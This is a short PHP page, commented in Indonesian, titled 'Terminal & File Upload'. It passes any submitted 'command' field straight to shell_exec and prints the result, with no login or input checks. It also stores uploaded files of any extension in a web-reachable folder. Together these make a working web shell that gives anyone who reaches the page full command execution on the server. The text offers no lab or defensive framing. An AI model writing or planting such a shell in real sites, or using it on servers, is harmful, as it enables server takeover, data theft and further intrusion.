<?php
// Skrip PHP untuk terminal dan unggahan file

// Fungsi untuk mengeksekusi perintah di terminal
function executeCommand($command) {
    // Menggunakan fungsi shell_exec untuk menjalankan perintah
    $output = shell_exec($command);
    // Mengembalikan hasil output dari perintah
    return $output;
}

// Cek jika ada permintaan unggahan file
if ($_FILES && $_FILES['file']) {
    $uploadDirectory = './uploads/'; // Direktori untuk menyimpan file yang diunggah

    // Membuat nama file unik dengan mempertahankan ekstensi
    $targetFileName = $uploadDirectory . uniqid() . '.' . pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);

    // Memindahkan file ke direktori yang ditentukan
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFileName)) {
        echo 'File berhasil diunggah.';
    } else {
        echo 'Gagal mengunggah file.';
    }
}

// Cek jika ada permintaan eksekusi perintah
if ($_POST && isset($_POST['command'])) {
    $command = $_POST['command'];

    // Mengeksekusi perintah dan mendapatkan outputnya
    $output = executeCommand($command);

    // Menampilkan output
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal & File Upload</title>
</head>
<body>
    <h1>Terminal & File Upload</h1>
    <!-- Form untuk mengunggah file -->
    <form action="" method="post" enctype="multipart/form-data">
        <label for="file">Unggah File:</label><br>
        <input type="file" name="file" id="file"><br>
        <input type="submit" value="Unggah">
    </form>
    <hr>
    <!-- Form untuk mengeksekusi perintah -->
    <form action="" method="post">
        <label for="command">Perintah:</label><br>
        <input type="text" name="command" id="command"><br>
        <input type="submit" value="Jalankan">
    </form>
</body>
</html>
